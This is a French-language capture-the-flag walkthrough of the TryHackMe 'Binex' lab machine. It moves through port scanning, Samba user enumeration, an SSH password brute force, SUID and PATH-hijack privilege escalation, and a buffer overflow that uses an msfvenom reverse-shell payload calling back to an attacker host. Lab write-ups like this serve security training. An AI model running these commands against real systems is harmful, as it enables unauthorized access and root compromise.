# TryHackMe: Binex

**Objectif** : exploiter la machine **Binex**  de TryHackMe pour récupérer les flags utilisateur et root, en passant par plusieurs techniques d'escalade.

---

## 1. Reconnaissance initiale

1. **Scan des ports** :

   ```bash
   nmap -Pn -p- $IP_CIBLE
   ```

   Ports ouverts : 22 (SSH), 139 & 445 (Samba).

2. **Scan approfondi** :

   ```bash
   sudo nmap -sV -sC -p 22,139,445 $IP_CIBLE
   ```

   - SSH : OpenSSH 7.6p1 Ubuntu (protocol 2.0)
   - Samba : smbd 3.x: 4.x & 4.7.6-Ubuntu (workgroup -> WORKGROUP)
   - Message signing SMB activé mais non requis (risqué)

---

## 2. Énumération Samba & utilisateurs

1. **Listing des partages** :

   ```bash
   smbclient -L $IP_CIBLE -N
   ```

   Partages visibles : `print$`, `IPC$` (pas d'accès invité).

2. **RID cycling** avec `enum4linux` :

   ```bash
   ./enum4linux -a $IP_CIBLE
   ```

   > Utilisateurs découverts : kel, des, tryhackme, noentry.

---

## 3. Bruteforce SSH (user tryhackme)

1. **Hydra + rockyou.txt** :

   ```bash
   hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://$IP_CIBLE
   ```

   Mot de passe trouvé pour `tryhackme` !

2. **Connexion SSH** :

   ```bash
   ssh tryhackme@$IP_CIBLE
   ```

---

## 4. Escalade SUID → utilisateur des

1. **Recherche SUID** :

   ```bash
   find / -type f -perm -u=s 2>/dev/null
   ```

   Binaire notable : `/usr/bin/find` (SUID, propriétaire : `des`).

2. **Shell en tant que des** :

   ```bash
   /usr/bin/find . -exec /bin/sh -p \; -quit
   ```

   ```bash
   id  # uid=1001(des)
   cat /home/des/flag.txt
   ```

---

## 5. Buffer overflow → utilisateur kel

1. **Génération du pattern** :

   ```bash
   pattern_create.rb -l 2000 > pattern.txt # (J'ai suivi l'indice donné au début de la Task 3)
   ```

   Transfert :

   ```bash
   scp pattern.txt des@$IP_CIBLE:/home/des/
   ```

2. **Trouver l'offset** avec GDB :

   ```bash
   gdb /home/des/bof
   run < pattern.txt
   info reg  # RBP=0x4134754133754132 → offset 608 + 8 = 616
   ```

3. **Choisir l'adresse de retour** :

   ```bash
   run < <(python3 -c "print('A'*800)")
   x/100x $rsp
   ```

   Adresse retenue : `0x7fffffffe32c`.

4. **Shellcode** :

   ```bash
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP_kali> LPORT=4444 -b '\x00' -f python
   ```

5. **Exploit** :`exploit.py`

   ```python
   from struct import pack
   payload_len = 616
   nop = b"\x90"*300
   rip = 0x7fffffffe32c
   buf = b"..."  # shellcode
   padding = b"A"*(payload_len - len(nop) - len(buf))
   payload = nop + buf + padding + pack("<Q", rip)
   print(payload)
   ```

6. **Exécution** :

   ```bash
   python3 exploit.py > exploit.bin
   nc -lvnp 4444 &
   ./bof < exploit.bin
   ```

   Shell `kel` obtenu, puis :

   ```bash
   cat /home/kel/flag.txt
   ```

---

## 6. Escalade finale : PATH Hijacking → root

1. **Analyse du binaire** :

   ```c
   // exe.c
   setuid(0); 
   setgid(0);
   system("ps");
   ```

2. Création d'un faux \*\*`` :

   ```bash
   export PATH=/tmp:$PATH
   echo "/bin/bash -p" > /tmp/ps
   chmod +x /tmp/ps
   ./exe
   ```

   Vous êtes root → `cat /root/root.txt`

---

## Conclusion

- **Étapes clés** : SSH → SUID → buffer overflow → PATH hijack
- **Bonnes pratiques** : vérifier SUID, connaître gtfobins, maîtriser buffer overflow, profiter des failles PATH.

---

**Auteur :** Saad Idrissi
